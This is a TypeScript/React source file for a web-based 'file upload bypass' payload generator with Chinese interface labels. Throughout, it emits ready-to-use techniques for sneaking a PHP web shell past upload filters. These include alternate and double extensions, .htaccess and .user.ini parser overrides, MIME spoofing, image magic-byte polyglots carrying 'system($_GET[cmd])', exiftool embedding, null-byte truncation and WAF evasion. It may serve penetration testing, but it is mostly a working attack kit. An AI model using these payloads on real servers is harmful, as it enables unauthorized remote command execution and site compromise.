import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

/* ============================================================
 * File Upload Bypass Generator
 * Generates bypass payloads for various upload restrictions.
 * ========================================================== */

const generateBypass = (filename: string, limit: string): string => {
  const fn = filename.trim() || 'shell.php';
  const lines: string[] = [];
  lines.push(`── 文件上传绕过 Payload ──`);
  lines.push(` [原始文件名] ${fn}`);
  lines.push(` [限制类型] ${limit}`);
  lines.push('');

  if (limit === 'extension') {
    lines.push(' ▸ 双扩展名绕过:');
    lines.push(`   ${fn.replace('.php', '.jpg.php')}`);
    lines.push(`   ${fn}.jpg`);
    lines.push(`   shell.jpg.php`);
    lines.push('');
    lines.push(' ▸ 备选扩展名绕过:');
    lines.push('   shell.php5');
    lines.push('   shell.php7');
    lines.push('   shell.phtml');
    lines.push('   shell.pht');
    lines.push('   shell.phar');
    lines.push('   shell.phps');
    lines.push('   shell.pgif');
    lines.push('   shell.shtml');
    lines.push('');
    lines.push(' ▸ 大小写绕过:');
    lines.push('   shell.PhP');
    lines.push('   shell.PHP');
    lines.push('   shell.pHp');
    lines.push('');
    lines.push(' ▸ 空格/点绕过:');
    lines.push('   shell.php ');
    lines.push('   shell.php.');
    lines.push('   shell.php .');
    lines.push('   shell .php');
    lines.push('');
    lines.push(' ▸ ::$DATA 绕过 (Windows):');
    lines.push('   shell.php::$DATA');
    lines.push('   shell.php::$DATA::.jpg');
    lines.push('');
    lines.push(' ▸ .htaccess 绕过:');
    lines.push('   # 上传 .htaccess 文件内容:');
    lines.push('   AddType application/x-httpd-php .jpg');
    lines.push('   # 然后上传 shell.jpg (内含PHP代码)');
    lines.push('');
    lines.push(' ▸ .user.ini 绕过:');
    lines.push('   # 上传 .user.ini 文件内容:');
    lines.push('   auto_prepend_file=shell.php');
    lines.push('');
  }

  if (limit === 'mime') {
    lines.push(' ▸ Content-Type 伪造:');
    lines.push('   Content-Type: image/jpeg');
    lines.push('   Content-Type: image/png');
    lines.push('   Content-Type: image/gif');
    lines.push('   Content-Type: application/octet-stream');
    lines.push('   Content-Type: text/plain');
    lines.push('');
    lines.push(' ▸ 多种 MIME 组合:');
    lines.push('   Content-Type: image/jpeg; charset=utf-8');
    lines.push('   Content-Type: application/x-httpd-php');
    lines.push('');
    lines.push(' ▸ 文件名 + MIME 组合:');
    lines.push('   文件名: shell.jpg,  MIME: application/x-httpd-php');
    lines.push('   文件名: shell.php,  MIME: image/jpeg');
    lines.push('');
  }

  if (limit === 'magic-bytes') {
    lines.push(' ▸ 图片魔术字节 + Webshell:');
    lines.push('   # GIF 头 + PHP 代码:');
    lines.push('   GIF89a<?php system($_GET["cmd"]); ?>');
    lines.push('');
    lines.push('   # PNG 头 + PHP 代码:');
    lines.push('   \\x89PNG\\r\\n\\x1a\\n<?php system($_GET["cmd"]); ?>');
    lines.push('');
    lines.push('   # JPEG 头 + PHP 代码:');
    lines.push('   \\xff\\xd8\\xff\\xe0<?php system($_GET["cmd"]); ?>');
    lines.push('');
    lines.push('   # BMP 头 + PHP 代码:');
    lines.push('   BM<?php system($_GET["cmd"]); ?>');
    lines.push('');
    lines.push(' ▸ polyglot 文件:');
    lines.push('   # GIF/PHP polyglot:');
    lines.push('   GIF89a<?=`$_GET[0]`?>');
    lines.push('   # JPG + PHP (在 EXIF/注释段嵌入):');
    lines.push('   exiftool -Comment="<?php system($_GET[\'cmd\']); ?>" shell.jpg');
    lines.push('');
  }

  if (limit === 'image-check') {
    lines.push(' ▸ 图片马 (真实图片 + 代码):');
    lines.push('   # 方法1: 在图片注释段嵌入PHP');
    lines.push('   exiftool -Comment="<?php system($_GET[\'cmd\']); ?>" normal.jpg');
    lines.push('   # 保存为 shell.jpg, 配合 .htaccess 或文件包含利用');
    lines.push('');
    lines.push('   # 方法2: 图片末尾追加PHP代码');
    lines.push('   copy /b normal.jpg + shell.php shell.jpg  (Windows)');
    lines.push('   cat normal.jpg shell.php > shell.jpg      (Linux)');
    lines.push('');
    lines.push('   # 方法3: GIF89a 头 + PHP');
    lines.push('   GIF89a<?php system($_GET["cmd"]); ?>');
    lines.push('');
    lines.push(' ▸ 绕过 getimagesize():');
    lines.push('   # 需要真实图片头, 不能仅靠 GIF89a');
    lines.push('   # 使用真实小图片 (1x1 gif/png) + 追加代码');
    lines.push('');
    lines.push(' ▸ 绕过二次渲染:');
    lines.push('   # 将代码嵌入图片不会被二次渲染清除的区域');
    lines.push('   # GIF: 在调色板后的数据块');
    lines.push('   # PNG: 在 IDAT 块的 PLTE 之后');
    lines.push('   # JPG: 在 EXIF/注释段');
    lines.push('');
  }

  if (limit === 'waf') {
    lines.push(' ▸ 分块传输绕过:');
    lines.push('   Transfer-Encoding: chunked');
    lines.push('   # 将文件内容分块发送, WAF 可能不重组');
    lines.push('');
    lines.push(' ▸ 多部分边界混淆:');
    lines.push('   Content-Type: multipart/form-data; boundary=----abc');
    lines.push('   # 使用异常 boundary 或嵌套 multipart');
    lines.push('');
    lines.push(' ▸ 文件名编码绕过:');
    lines.push('   Content-Disposition: form-data; name="file"; filename*=utf-8\'\'shell.php');
    lines.push('   # filename 使用 RFC 5987 编码');
    lines.push('');
    lines.push(' ▸ 双写文件名:');
    lines.push('   shell.pphphp  -> 过滤一次 php 后变为 shell.php');
    lines.push('');
    lines.push(' ▸ 空字节截断:');
    lines.push('   shell.php%00.jpg');
    lines.push('   shell.php\\x00.jpg');
    lines.push('');
    lines.push(' ▸ 特殊字符:');
    lines.push('   shell.php;  (分号)');
    lines.push('   shell.php\\n  (换行)');
    lines.push('   shell.php\\r\\n  (CRLF)');
    lines.push('');
  }

  lines.push(' 说明:');
  lines.push('  - 双扩展名 (shell.jpg.php) 绕过基于最后扩展名的检查');
  lines.push('  - .php5/.phtml/.phar 等 PHP 备选扩展名需服务器配置支持');
  lines.push('  - .htaccess / .user.ini 可改变服务器对文件类型的解析');
  lines.push('  - 图片马需配合文件包含或 .htaccess 才能执行');
  lines.push('  - ::$DATA 是 Windows NTFS 备用数据流, 会忽略扩展名检查');
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="文件上传绕过"
    paramsConfig={[
      {
        name: 'limit',
        label: '限制类型',
        type: 'select',
        default: 'extension',
        options: [
          { value: 'extension', label: '扩展名检查' },
          { value: 'mime', label: 'MIME检查' },
          { value: 'magic-bytes', label: '魔术字节' },
          { value: 'image-check', label: '图片检查' },
          { value: 'waf', label: 'WAF' },
        ],
      },
    ]}
    execute={(input: string, _mode: string, params: Record<string, unknown>): string => {
      const limit = (params.limit as string) ?? 'extension';
      return generateBypass(input, limit);
    }}
  />
);
export default ToolComponent;
